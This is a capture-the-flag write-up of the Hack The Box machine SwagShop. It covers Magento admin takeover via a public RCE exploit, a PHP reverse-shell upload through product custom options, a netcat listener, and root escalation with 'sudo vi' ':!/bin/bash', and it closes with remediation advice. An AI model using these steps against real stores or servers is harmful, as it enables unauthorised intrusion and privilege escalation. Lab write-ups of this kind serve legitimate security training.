# SwagShop

```
kali@kali:~/htb/SwagShop$ sudo nmap -p- -sV -sC 10.129.1.182
[sudo] password for kali: 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 17:09 EST
Nmap scan report for 10.129.1.182
Host is up (0.028s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Did not follow redirect to http://swagshop.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.05 seconds
```

I check out the webpage and I'm greeted with a shop built on Magento.

```
kali@kali:~/htb/SwagShop$ searchsploit magento
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection                                                              | php/webapps/38573.txt
eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Execution / Denial of Service)                                   | php/webapps/38651.txt
Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login['Username']' Cross-Site Scripting                        | php/webapps/32808.txt
Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexController.php?email' Cross-Site Scripting                  | php/webapps/32809.txt
Magento 1.2 - 'downloader/index.php' Cross-Site Scripting                                                                 | php/webapps/32810.txt
Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File                                                            | php/webapps/39838.php
Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution                                                              | php/webapps/37811.py
Magento eCommerce - Local File Disclosure                                                                                 | php/webapps/19793.txt
Magento eCommerce - Remote Code Execution                                                                                 | xml/webapps/37977.py
Magento Server MAGMI Plugin - Multiple Vulnerabilities                                                                    | php/webapps/35996.txt
Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion                                                               | php/webapps/35052.txt
Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Process Bypass                                              | php/webapps/48135.php
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I check out the RCE exploit, and it looks promising.

It requires a target, and an admin directory. I don't find one in /admin/, but index.php/admin reveals a login page.

```
kali@kali:~/htb/SwagShop$ python exploit.py 
WORKED
Check http://swagshop.htb/admin with creds forme:forme
kali@kali:~/htb/SwagShop$ 
```

And now I can log in with forme:forme. Nice.

I look around for a while, and find some options that reduce security such as symlink enabling. So I enable that while I'm there.

I look around at the products and see that there are a lot of options for editing. So I go to custom, and I can see that I can upload files here.

I add a custom file rule, and add php to the list of allowed extensions.

I go to the store and add some products to my shopping cart as well as add my reverse shell php file.

After I add them, I get a link to the file here:

`http://swagshop.htb/index.php/sales/download/downloadCustomOption/id/7/key/80fbc00f0773d0e59c4e/`

Clicking on it gives me a download option. Which I don't want.

I run a wfuzz command and immediately find media:

```
kali@kali:~/htb/SwagShop$ sudo wfuzz -c -L --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://swagshop.htb/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://swagshop.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                    
=====================================================================

000000001:   200        327 L    904 W      16593 Ch    "# directory-list-2.3-medium.txt"                                                          
000000003:   200        327 L    904 W      16593 Ch    "# Copyright 2007 James Fisher"                                                            
000000007:   200        327 L    904 W      16593 Ch    "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                          
000000014:   200        327 L    904 W      16593 Ch    "http://swagshop.htb/"                                                                     
000000009:   200        327 L    904 W      16593 Ch    "# Suite 300, San Francisco, California, 94105, USA."                                      
000000006:   200        327 L    904 W      16593 Ch    "# Attribution-Share Alike 3.0 License. To view a copy of this"                            
000000002:   200        327 L    904 W      16593 Ch    "#"                                                                                        
000000004:   200        327 L    904 W      16593 Ch    "#"                                                                                        
000000013:   200        327 L    904 W      16593 Ch    "#"                                                                                        
000000012:   200        327 L    904 W      16593 Ch    "# on atleast 2 different hosts"                                                           
000000011:   200        327 L    904 W      16593 Ch    "# Priority ordered case sensative list, where entries were found"                         
000000010:   200        327 L    904 W      16593 Ch    "#"                                                                                        
000000008:   200        327 L    904 W      16593 Ch    "# or send a letter to Creative Commons, 171 Second Street,"                               
000000005:   200        327 L    904 W      16593 Ch    "# This work is licensed under the Creative Commons"                                       
000000080:   200        21 L     115 W      1917 Ch     "media"   
```

and I find my file at `http://swagshop.htb/media/custom_options/quote/s/h/80fbc00f0773d0e59c4ec56e454437ea.php`


And on our listener:

```
kali@kali:~/htb/SwagShop$ sudo nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.129.1.182 36302
Linux swagshop 4.4.0-146-generic #172-Ubuntu SMP Wed Apr 3 09:00:08 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 23:14:01 up  9:29,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ 
```


I elevate my shell with `script /dev/null -c bash`, ctrl+Z to bg the process, `stty raw -echo`, `fg` to foreground, `reset`, and `xterm`.

I then `export TERM=xterm;export SHELL=bash`

Now I have a nice shell to work with.

```
www-data@swagshop:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@swagshop:/$ sudo -l 
Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
www-data@swagshop:/$ 
```

immediately I find that we have some root priveleges. I know for sure vim can be used to run an elevated shell. Not sure with vi.

```
www-data@swagshop:/var/www/html$ sudo /usr/bin/vi /var/www/html/index.php

/// IN VI ///
:!/bin/bash
/////////////

root@swagshop:/var/www/html# whoami
root
root@swagshop:/var/www/html# 
```

And there we go :)

## Comparing myself to the official writeup:


The official writeup used magescan to scan the website, which is a new tool for me.

They use the same rce code I used.

They then use the other RCE exploit manually to get code execution via requests.

They also highlight another outdated way which uploads a malicious package to the magenta server.

They run the same command I did with vi to get root. But they add the command like this:

`sudo /usr/bin/vi /var/www/html/index.php -c ':!/bin/bash'`

cool, I didn't know I could add commands like that.

## How to stop this exploit:

This mostly comes down to two things. An insecure version of magento that allows the attacker to get access to the server.

And a misconfigured server, which allows the attacker to elevate priviliges easily.


Updating Magento should suffice, and then remove the sudo vi access for the www-data user.








